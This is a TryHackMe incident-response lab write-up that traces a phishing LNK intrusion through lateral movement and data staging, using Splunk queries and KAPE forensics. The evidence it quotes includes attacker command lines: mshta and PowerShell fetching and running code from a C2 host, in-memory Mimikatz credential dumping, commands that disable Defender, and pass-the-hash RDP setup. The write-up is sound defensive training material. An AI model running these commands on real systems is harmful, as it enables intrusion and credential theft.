# TryHackMe: Zero Tolerance — Writeup

**Room type:** Guided / Incident Response  
**Category:** DFIR / Windows / Endpoint  
**Tools:** Splunk, KAPE artifacts  

---

## Overview

ProbablyFine Ltd has just gone live monitoring VaultSecure Banking — a massive contract with a zero-tolerance clause. Within four hours of monitoring going live, a critical alert fires: suspicious persistence mechanism detected. L2 is in meetings. L3 is live on a webinar. It's just us and the SIEM.

The room gives us two evidence sources: a Splunk instance loaded with Windows Event Logs and Sysmon telemetry from the affected hosts, and a KAPE triage collection extracted to `/tmp/JP-BROWN-WS/` and `/tmp/BKUP-SRV01/`. The kill chain spans two machines and covers the full MITRE ATT&CK lifecycle: initial access → execution → C2 → persistence → defense evasion → credential dumping → lateral movement → collection → staging.

Before touching any question, orient:

```spl
index=* | stats count by sourcetype, host | sort -count
```

```
WinEventLog    JP-BROWN-WS    29922
WinEventLog    BKUP-SRV01     11309
```

Two hosts. JP-BROWN-WS has nearly triple the events — that's the beachhead. The source names matter here because Splunk indexed everything under a single `WinEventLog` sourcetype, meaning we filter by `source` rather than `sourcetype`:

```spl
index=* host="JP-BROWN-WS" | stats count by source
```

```
WinEventLog:Microsoft-Windows-Sysmon/Operational    29260
WinEventLog:Security                                  662
```

Sysmon is the primary goldmine with 29,260 events. Security logs give us authentication telemetry. Let's hunt.

---

## Q1 — What is the hostname where the Initial Access occurred?

**Answer: `JP-BROWN-WS`**

Answered immediately from the event distribution above. JP-BROWN-WS has the most activity, has a user account (`jp.brown`) with browser and download artifacts, and is the machine where the alert fired. BKUP-SRV01 is the lateral movement target we'll get to later.

---

## Q2 — What MITRE ATT&CK sub-technique ID describes the initial code execution method on the beachhead?

**Answer: `T1204.002`**

This one requires knowing the execution method before we can classify it. The answer emerges from hunting the process chain — specifically this cluster of events at 05:04:56:

```
7-Zip extracts:   TravisClart_Resume.pdf.lnk
mshta.exe runs:   http://10.10.14.174:80/KsWLx.hta
```

The user opened what they thought was a PDF resume. It was a Windows LNK shortcut file — a malicious file requiring user interaction to execute. That maps to **T1204.002: User Execution — Malicious File**. The `.lnk` extension is the tell; LNK files can contain arbitrary command execution and are a classic phishing delivery mechanism.

---

## Q3 — What is the full path of the malicious file that led to Initial Access?

**Answer: `C:\Users\jp.brown\Downloads\TravisClart_Resume.pdf.lnk`**

Two data sources confirm this independently, which is satisfying when they agree.

**From Sysmon EventCode 11 (File Creation):**

```spl
index=* host="JP-BROWN-WS" source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=11
| where _time >= strptime("2025-11-14 05:00:00", "%Y-%m-%d %H:%M:%S")
| where _time <= strptime("2025-11-14 05:06:00", "%Y-%m-%d %H:%M:%S")
| table _time, Image, TargetFilename
| sort _time
```

At 05:04:42, `7zG.exe` created `C:\Users\jp.brown\Downloads\TravisClart_Resume.pdf.lnk`.

**From Chrome download history (KAPE):**

```bash
sqlite3 "/tmp/JP-BROWN-WS/C/Users/jp.brown/AppData/Local/Google/Chrome/User Data/Default/History" \
  "SELECT datetime(start_time/1000000-11644473600,'unixepoch'), target_path, tab_url FROM downloads ORDER BY start_time DESC LIMIT 10;"
```

Chrome downloaded `TravisClart_Resume.zip` from Google Drive at 05:04:25. Seventeen seconds later, 7-Zip extracted `TravisClart_Resume.pdf.lnk`. The attacker weaponized a fake resume ZIP, betting that jp.brown would open it — and they did.

---

## Q4 — What is the full path to the LOLBin abused by the attacker for Initial Access?

**Answer: `C:\Windows\System32\mshta.exe`**

The LNK file launched `mshta.exe` with a remote URL argument. This shows up in the process creation data at 05:04:56:

```
Parent: (no parent - already exited)
Image:  C:\Windows\System32\mshta.exe
CMD:    "C:\Windows\System32\mshta.exe" http://10.10.14.174:80/KsWLx.hta
```

`mshta.exe` (Microsoft HTML Application Host) is a signed Windows binary designed to execute `.hta` files. Attackers abuse it as a LOLBin because it can fetch and execute remote scripts over HTTP while bypassing many application whitelisting controls. The attacker hosted `KsWLx.hta` on their C2 server and had the LNK file call `mshta.exe` with the remote URL — no dropper needed on disk.

---

## Q5 — What is the IP address of the attacker's Command & Control server?

**Answer: `10.10.14.174`**

Visible in multiple places simultaneously at 05:04:56:

```
mshta.exe   → http://10.10.14.174:80/KsWLx.hta
PowerShell  → DownloadFile('http://10.10.14.174:80/RuntimeBroker.exe', ...)
```

The HTA file that `mshta.exe` fetched contained PowerShell to download the second-stage payload. Same IP, same port 80. The attacker ran their C2 on a standard web port to blend with normal HTTP traffic — a common evasion technique against network-level controls that only inspect uncommon high ports.

---

## Q6 — What is the full path of the process responsible for the C2 beaconing?

**Answer: `C:\Windows\Temp\RuntimeBroker.exe`**

The PowerShell command embedded in the HTA downloaded the payload to a deliberately deceptive location:

```
(New-Object Net.WebClient).DownloadFile('http://10.10.14.174:80/RuntimeBroker.exe',
                                         'C:\Windows\Temp\RuntimeBroker.exe')
```

The real `RuntimeBroker.exe` lives in `C:\Windows\System32\` and is a legitimate Windows process for managing app permissions. Dropping a malicious binary with the same name into `C:\Windows\Temp\` is a masquerading technique — a casual observer checking Task Manager would see "RuntimeBroker.exe" and not immediately flag it.

The process launched at 05:04:56 with PID 6900, parented by `mshta.exe` (PID 3132):

```spl
index=* host="JP-BROWN-WS" source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
| where Image="C:\\Windows\\Temp\\RuntimeBroker.exe"
| table _time, Image, ProcessId, ParentProcessId, ParentImage
```

---

## Q7 — What is the full registry path that the threat actor modified for persistence on the beachhead host?

**Answer: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SystemMonitor`**

Simultaneously with launching the C2 beacon, `mshta.exe` also spawned `reg.exe` to write a Run key:

```
Image:  C:\Windows\System32\reg.exe
CMD:    reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run 
        /v SystemMonitor /t REG_SZ /d "C:\Windows\Temp\RuntimeBroker.exe" /f
```

Confirmed by Sysmon EventCode 13 (Registry value set) at 05:04:56:

```spl
index=* host="JP-BROWN-WS" source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=13
| where _time >= strptime("2025-11-14 05:04:00", "%Y-%m-%d %H:%M:%S")
| where _time <= strptime("2025-11-14 05:06:00", "%Y-%m-%d %H:%M:%S")
| table _time, Image, TargetObject, Details
```

The value name `SystemMonitor` sounds like a legitimate monitoring agent. The Run key fires every time `jp.brown` logs in, ensuring the C2 beacon survives reboots. Persistence established in the same second as initial execution — this was automated, not manual.

---

## Q8 — What tool and parameter did the threat actor use for credential dumping?

**Answer: `Invoke-Mimikatz -DumpCreds`**

The C2 beacon (`RuntimeBroker.exe`) spawned an encoded PowerShell command at 05:09:34. Decoding the base64 reveals:

```powershell
IEX (New-Object Net.WebClient).DownloadString(
  'https://raw.githubusercontent.com/BC-SECURITY/Empire/main/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1'
); Invoke-Mimikatz -DumpCreds
```

This is the Empire framework's PowerShell port of Mimikatz, downloaded from GitHub and executed entirely in memory — no file touches disk, which is why host-based AV scanning wouldn't catch it. The `-DumpCreds` parameter extracts all cached credentials from LSASS memory.

The attacker also ran the binary version directly later:

```
C:\Users\jp.brown\Downloads\x64\mimikatz.exe
```

Chrome download history confirms they pulled `mimikatz_trunk.7z` from GitHub at 05:14:56.

---

## Q9 — What specific parameter did the threat actor use to weaken endpoint defenses?

**Answer: `DisableRealtimeMonitoring`**

At 05:08:46, `RuntimeBroker.exe` spawned encoded PowerShell. The decoded command:

```powershell
powershell.exe -exec bypass -w hidden -c "Set-MpPreference -DisableRealtimeMonitoring 1 
-ErrorAction SilentlyContinue; Set-MpPreference -ExclusionPath 'C:\' 
-ErrorAction SilentlyContinue"
```

Two actions here: disabling Windows Defender real-time monitoring, and adding the entire C drive as an exclusion path. The `-ErrorAction SilentlyContinue` suppresses any errors silently so the command doesn't alert through PowerShell error output. This ran before the Mimikatz credential dump — the attacker blinded the AV before doing the noisiest part of the operation.

---

## Q10 — What is the PID of the process that initiated the remote execution?

**Answer: `6612`**

The lateral movement chain on JP-BROWN-WS:

```
RuntimeBroker.exe (PID 6900)
  └─ cmd.exe (PID 6748)
       └─ PsExec64.exe (PID 6612)
            └─ [connects to 10.10.152.240]
```

At 05:17:59:

```
CMD: PsExec64.exe \\10.10.152.240 cmd /c 
     "reg add HKLM\System\CurrentControlSet\Control\Lsa 
     /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f"
```

The attacker used PsExec to remotely disable RestrictedAdmin mode on BKUP-SRV01 — a prerequisite for pass-the-hash RDP. **PsExec64.exe itself (PID 6612) is the process that initiated the remote execution**, not its parents. The room wants the tool that did the work, not the process tree above it.

On BKUP-SRV01, this shows up as `PSEXESVC.exe` (PID 3824) being installed and spawning a `cmd.exe` that ran the reg command:

```spl
index=* host="BKUP-SRV01" source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
| where _time >= strptime("2025-11-14 05:18:00", "%Y-%m-%d %H:%M:%S")
| where _time <= strptime("2025-11-14 05:19:00", "%Y-%m-%d %H:%M:%S")
| table _time, Image, ProcessId, ParentImage, CommandLine
```

---

## Q11 — At what time did the threat actor successfully log in to the remote system from the beachhead?

**Answer: `2025-11-14 05:19:42`**

At 05:19:38, `mimikatz.exe` (PID 2772) on JP-BROWN-WS spawned:

```
mstsc.exe /restrictedadmin /v:10.10.152.240
```

The `/restrictedadmin` flag enables pass-the-hash RDP — connecting with a credential hash rather than the plaintext password, using the `bkup-svc` credentials dumped earlier.

On BKUP-SRV01, the Security log shows the successful login:

```spl
index=* host="BKUP-SRV01" source="WinEventLog:Security" EventCode=4624
| where _time >= strptime("2025-11-14 05:19:00", "%Y-%m-%d %H:%M:%S")
| table _time, Account_Name, Logon_Type, Source_Network_Address
```

At **05:19:42**, `bkup-svc` logged in from `10.10.52.82` (JP-BROWN-WS) via Logon Type 10 (RemoteInteractive/RDP). Four seconds from launching mstsc to a successful session.

---

## Q12 — What is the full path of the PowerShell script used by the threat actor to collect data?

**Answer: `C:\Windows\Temp\Setup-BackupServer.ps1`**

At 05:21:26 on BKUP-SRV01, the attacker ran from an interactive cmd.exe session:

```powershell
powershell -exec bypass -w hidden -c 
  'Invoke-WebRequest -Uri "http://10.10.14.174:80/Setup-BackupServer.ps1" 
   -OutFile "C:\Windows\Temp\Setup-BackupServer.ps1";
   & "C:\Windows\Temp\Setup-BackupServer.ps1"'
```

The script was also confirmed in the KAPE artifacts at `/tmp/BKUP-SRV01/C/Windows/Temp/Setup-BackupServer.ps1`.

There's a second script, `C:\Users\bkup-svc\Documents\Backup_Cache.ps1`, that a scheduled task (`DailyBackupVerification`) runs every 20 minutes — but that's persistence for the collection operation. `Setup-BackupServer.ps1` is the primary collection payload the attacker deployed and executed directly.

---

## Q13 — What are the first four file extensions targeted by this script for collection?

**Answer: `.bak, .backup, .sql, .mdb`**

The script defines its target extensions as an array:

```powershell
$extensions = @('*.bak','*.backup','*.sql','*.mdb','*.accdb','*.vhd','*.vhdx','*.vmdk',
                 '*.config','*.xml','*.key','*.pem','*.pfx','*.p12','*.cer','*.crt')
```

The first four are database backup and legacy database formats — exactly what you'd target on a backup server. The full list also sweeps for virtual disk images, configuration files, and cryptographic keys. This is a purpose-built backup exfiltration script, not a generic data collector.

The format the room expected was `.bak, .backup, .sql, .mdb` — dot prefix, comma-space separated, no asterisks.

---

## Q14 — What is the full path to the staged file containing collected files?

**Answer: `C:\Users\bkup-svc\AppData\Local\Temp\sysbackup_20251114.dat`**

The script's staging logic:

```powershell
$tempDir    = "$env:TEMP\~BK" + (Get-Random -Maximum 9999)   # random temp working dir
$archiveZip = "$env:TEMP\sysbackup_" + (Get-Date -Format 'yyyyMMdd') + ".zip"
$archiveTmp = "$env:TEMP\sysbackup_" + (Get-Date -Format 'yyyyMMdd') + ".dat"

# ... copies files to $tempDir, compresses to $archiveZip ...
# ... renames .zip to .dat to disguise as non-archive ...
# ... deletes $tempDir and $archiveZip ...
```

Three things to note: the script uses `$env:TEMP` (not a hardcoded path), renames the ZIP to `.dat` to evade file-type detection, and cleans up the working directory and original archive. The final artifact is a ZIP disguised as a `.dat` file.

The session ran as `bkup-svc` (confirmed by the `DailyBackupVerification` scheduled task XML: `<UserId>bkup-svc</UserId>`), so `$env:TEMP` resolves to `C:\Users\bkup-svc\AppData\Local\Temp\`. The incident occurred on 2025-11-14, giving us the full path.

---

## Full Attack Timeline

```
2025-11-14 05:04:25   Chrome downloads TravisClart_Resume.zip from Google Drive
2025-11-14 05:04:41   7-Zip extracts TravisClart_Resume.pdf.lnk
2025-11-14 05:04:56   jp.brown opens the LNK → launches mshta.exe http://10.10.14.174:80/KsWLx.hta
2025-11-14 05:04:56   mshta.exe executes KsWLx.hta → PowerShell downloads RuntimeBroker.exe
2025-11-14 05:04:56   RuntimeBroker.exe (PID 6900) launches → C2 beacon established
2025-11-14 05:04:56   reg.exe sets HKCU\...\Run\SystemMonitor → persistence
2025-11-14 05:08:46   RuntimeBroker.exe disables Defender real-time monitoring, excludes C:\
2025-11-14 05:09:34   RuntimeBroker.exe runs Invoke-Mimikatz -DumpCreds via encoded PS
2025-11-14 05:14:56   jp.brown downloads mimikatz_trunk.7z from GitHub
2025-11-14 05:15:51   mimikatz.exe run directly from C:\Users\jp.brown\Downloads\x64\
2025-11-14 05:17:59   PsExec64.exe (PID 6612) remotely disables RestrictedAdmin on BKUP-SRV01
2025-11-14 05:19:38   mimikatz.exe spawns mstsc.exe /restrictedadmin /v:10.10.152.240
2025-11-14 05:19:42   bkup-svc logs into BKUP-SRV01 from JP-BROWN-WS (Logon Type 10)
2025-11-14 05:21:26   Attacker downloads and executes Setup-BackupServer.ps1 on BKUP-SRV01
2025-11-14 05:36:23   DailyBackupVerification scheduled task fires Backup_Cache.ps1 (persistence)
2025-11-14 05:??:??   sysbackup_20251114.dat staged in bkup-svc's temp directory
```

---

## Investigative Notes

**The sourcetype/source distinction.** Splunk indexed everything under a single `WinEventLog` sourcetype. Filtering by `sourcetype` works at the index level but won't separate Sysmon from Security logs — you need `source="WinEventLog:Microsoft-Windows-Sysmon/Operational"` for that. Getting this wrong early means your EventCode filters won't behave as expected.

**Sysmon EventCode mapping for this investigation.**
- EventCode 1 — Process creation (the workhorse for kill chain reconstruction)
- EventCode 11 — File creation (caught the LNK extraction)
- EventCode 13 — Registry value set (caught the Run key persistence)

**The PID question is about the initiating tool, not the process tree.** Q10 rejected `RuntimeBroker.exe` (6900) and its child `cmd.exe` (6748) before accepting `PsExec64.exe` (6612). The room defines "initiated" as the tool that actually made the remote connection, not its ancestors in the process tree.

**LNK files as a delivery mechanism.** The `.pdf.lnk` extension is effective social engineering — Windows hides known extensions by default, so many users see `TravisClart_Resume.pdf` with a document icon. The LNK file can embed an arbitrary command in its Target field, making it a full code execution primitive that doesn't require macros, exploits, or admin rights.

**Pass-the-hash RDP with `/restrictedadmin`.** The attacker's lateral movement sequence was methodical: dump credentials with Mimikatz → use PsExec to enable RestrictedAdmin mode on the target → use `mstsc.exe /restrictedadmin` to RDP using a credential hash instead of plaintext. RestrictedAdmin mode is a Windows feature designed to limit credential exposure over RDP, but it has the side effect of allowing hash-based authentication — a feature the attacker deliberately enabled and exploited.

**Staging disguise.** Renaming a ZIP to `.dat` is a simple but effective technique to evade file-type scanners that rely on extension rather than magic bytes. The script also deleted the working directory and the original ZIP after renaming, leaving only the `.dat` file as the artefact — cleaning up after itself to reduce forensic footprint.

**Two collection scripts, one purpose.** `Setup-BackupServer.ps1` was the manually-executed collection payload deployed via the C2 channel. `Backup_Cache.ps1` was a second, nearly identical script installed as a scheduled task (`DailyBackupVerification`) to run every 20 minutes — a persistence mechanism for the collection operation in case the first run failed or the session dropped. The room's Q12 wanted the directly-executed payload, not the persistence copy.
